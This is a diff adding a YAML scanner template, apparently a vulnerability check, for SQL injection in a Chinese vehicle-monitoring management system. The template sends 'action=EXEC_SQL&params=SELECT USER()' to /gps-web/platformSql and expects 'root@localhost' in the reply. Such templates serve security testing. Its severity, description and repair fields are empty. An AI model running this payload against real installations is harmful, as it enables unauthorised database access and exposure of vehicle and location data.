@@ -1,0 +1,24 @@
+id:
+info:
+  name: 三一谦成车辆监控综合管理系统 platformSql SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /gps-web/platformSql
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept: '*/* '
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+  data: |
+    action=EXEC_SQL&params=SELECT USER()
+response1:
+  headers:
+  body: root@localhost
+  code: 200
+requests2:
+response2:
